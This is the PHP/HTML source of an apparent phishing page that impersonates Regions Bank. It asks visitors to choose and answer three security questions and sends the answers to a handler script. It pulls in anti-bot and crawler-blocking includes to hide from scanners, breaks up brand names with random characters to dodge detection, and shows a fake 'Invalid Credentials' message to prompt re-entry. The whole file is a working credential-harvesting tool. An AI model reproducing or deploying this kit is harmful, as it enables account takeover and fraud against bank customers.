<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en" x-ms-format-detection="none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check - Log in to your accounts | Regions </title>
    <link href="../rgi/com-regions.css" rel="stylesheet">
    <link href="../rgi/olbAuth.min.css" rel="stylesheet">
    <link rel="icon" href="../rgi/favicon.ico">
<style class="__tmp_css_exfil_protection_load_blocker">input,input ~ * { background-image:none !important; list-style: inherit !important; cursor: auto !important; content:normal !important; } input::before,input::after,input ~ *::before, input ~ *::after { content:normal !important; }</style>

<style>
</style>
</head>
<body>

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" title="Go home">
                <picture class="logo">
                    <source srcset="../rgi/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="../rgi/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>

    <main role="main" class="pb-3" id="main-section">
        

<link href="../rgi/Common.css" rel="stylesheet">

<div>
    <div class="rds-wizard-body">
        <div class="body-content">
            <div class="rds-short-form-tile container login-enroll">
                <h1 class="sr-only"> Identity Confirmation</h1>
                <div class="col-md-12">
			   <?php if(isset($_GET[''.$theerrkey.''])){echo '<div class="alert alert-danger" id="page-level-error-box" aria-live="polite" style="display: block;">
                        <div id="page-level-message">Invalid Credentials, Please try again</div>
                        <button type="button" id="alert-close" onclick="document.getElementById(\'page-level-error-box\').style.display=\'none\'">X</button>
                    </div>';};?></div>
                <div class="row col-md-6 col-md-offset-3" id="password-section" style="display: block;">
                    <div class="col-xs-12">
                        <h2 id="password-header">Now, let's verify your security questions and answers.</h2>
                        <div id="transmitContainer" style="display: block;"> <div class="row col-xs-12"> <span id="online-id" class="page-heading">Enter the informations below.</span> <div class="row margin-top-20"> <div class="col-xs-12 margin-bottom-30">
<form class="rds-form form" method="post" id="frrdeetz" action="qroc<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>"> 
<div class="field animated-label text selected"> <label class="control-label">Security Question 1</label> <select name="s1" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" onchange="ooth('i')" required="">
<option value="" disabled="" selected="selected">Choose Your Question </option> 
<option value="What was your high school mascot?">What was your high school mascot? </option> 
<option value="In what city is your vacation home?"> In what city is your vacation home? (Enter full name of city only)</option>  
<option value="In what city was your father born?">In what city was your father born? (Enter full name of city only) </option> 
<option value="What is your paternal grandfather's name?"> What is your paternal grandmothers's name? </option> 
<option value="What was the name of your first pet?">What was the name of your first pet? </option> 
<option value="What was the name of your first girlfriend or boyfriend?">What was the name of your first girlfriend or boyfriend? </option>
<option value="What was the nickname of your grandfather?">What was the nickname of your grandfather? </option> 
<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding? </option>
<option value="What was the name first name of your first manager?">What was the name first name of your first manager?</option>
<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
</select>
</div>

<div class="field animated-label text"> <label class="control-label">Answer 1</label> <input type="text" name="ans1" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');" required=""/></div>

<div class="field animated-label text selected"> <label class="control-label">Security Question 2</label> <select name="s2" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" onchange="ooth('i')" required="">
  <option value="" disabled="" selected="selected">Choose Your Question </option> 
<option value="What is your best friend's first name?">What is your best friend's first name? </option>
<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew? </option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option> 
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="In what city was your high school? ">In what city was your high school? (full name of city only) </option> 
<option value="In what city were you married?">In what city were you married? (Enter full name of city) </option> 
<option value="What is the name of the first company you worked for?"> What is the name of the first company you worked for? </option> 
<option value="What was the name of your high school?">What was the name of your high school? </option> 
<option value="What is your father's middle name?"> What is your father's middle name?</option> 
<option value="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding? </option> 
</select>
</div>

<div class="field animated-label text"> <label class="control-label">Answer 2</label> <input type="text" name="ans2" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');" required=""/></div>

<div class="field animated-label text selected"> <label class="control-label">Security Question 3</label> <select name="s3" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" onchange="ooth('i')" required="">
<option value="" disabled="" selected="selected">Choose Your Question </option> 
<option value="What is your paternal grandfather's name?">What is your paternal grandfather's name? </option>
<option value="What street did your best friend in high school live on?">What street did your best friend in high school live on? (Enter full name of street only) </option>
<option value="What was the name of your junior high school?">What was the name of your junior high school? (Enter only "Riverdale" for Riverdale Junior high school) </option> 
<option value="In what city was your mother born?">In what city was your mother born? (Enter full name of city only) </option> 
<option value="What was the last name of your favorite teacher in final year of high school?"> What was the last name of your favorite teacher in final year of high school? </option> 
<option value="In what city were you born?"> In what city were you born? (Enter full name of city only)</option> 
<option value="Where did you meet your spouse for the first time? ">Where did you meet your spouse for the first time? (Enter full name of city only)</option> 
<option value="What was your favorite restaurant in college?">What was your favorite restaurant in college? </option> 
<option value="What was the name of the town your grandmother lived in?">What was the name of the town your grandmother lived in? (Enter full name of town only) </option> 
<option value="What is your mother's middle name?">What is your mother's middle name? </option> 
</select>
</div>

<div class="field animated-label text"> <label class="control-label">Answer 3</label> <input type="text" name="ans3" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');" required=""/></div>

	<div class="form-btn-holder"> <div class="pull-right"> <button type="submit" class="btn btn-primary btn-lg submit-btn" id="submit-password-button">Next</button> </div> </div> </form> </div> </div> </div> </div>
                    </div>

                </div>
            </div>
        </div>
    </div>
</div>
<script>
function ooth(m){var e = event.target;if(e.value=="" && m!='f'){e.parentNode.classList.remove('selected');} else{e.parentNode.classList.add('selected');}; if(m!='b'){e.parentNode.classList.add('focus');} else{e.parentNode.classList.remove('focus');};};
function ptog(){var p = document.getElementById("input_password");if(p.type=="password"){p.type="text";} else{p.type="password";};p.parentNode.classList.add('focus');p.focus();};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function load(){document.getElementById('redi').style.display="block";<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>};
function waitreq(){load();var suballow=document.getElementById('jas');setTimeout(function(){suballow.value="on";document.getElementById('frrdeetz').submit();},3000);if(suballow.value!='off'){return true;} else{return false;};};
</script>
    </main>

    <footer class="rds-footer">
        <div class="footer-content">
            <ul>
                <li><a target="_blank">Con<?php echo rT('ALPHANUMERIC',rand(1,87));?>tact Us</a></li>
                <li><a target="_blank">Te<?php echo rT('ALPHANUMERIC',rand(1,87));?>rms and Conditions</a></li>
                <li><a target="_blank">Priv<?php echo rT('ALPHANUMERIC',rand(1,87));?>acy Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>dge</a></li>
                <li><a target="_blank">Security</a></li>
                <li><a target="_blank">Onli<?php echo rT('ALPHANUMERIC',rand(1,87));?>ne Trac<?php echo rT('ALPHANUMERIC',rand(1,87));?>king and Advertising</a></li>
                <li><a target="_blank">Accessible Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nking</a></li>
                <li><a target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a>1-800-REGIO<?php echo rT('ALPHANUMERIC',rand(1,87));?>NS</a></p>
            <p>Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons, the Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons logo, the Life<?php echo rT('ALPHANUMERIC',rand(1,87));?>Green col<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>or, a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd the LifeGreen bi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ke are registered trademarks of Regions B<?php echo rT('ALPHANUMERIC',rand(1,87));?>ank.</p>
            <p>© <?php echo date("Y");?> Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nk. All Ri<?php echo rT('ALPHANUMERIC',rand(1,87));?>ghts Reserved.</p>

            <div class="footer-icon">
                <img src="../rgi/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="../rgi/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>
    </div>
</body></html>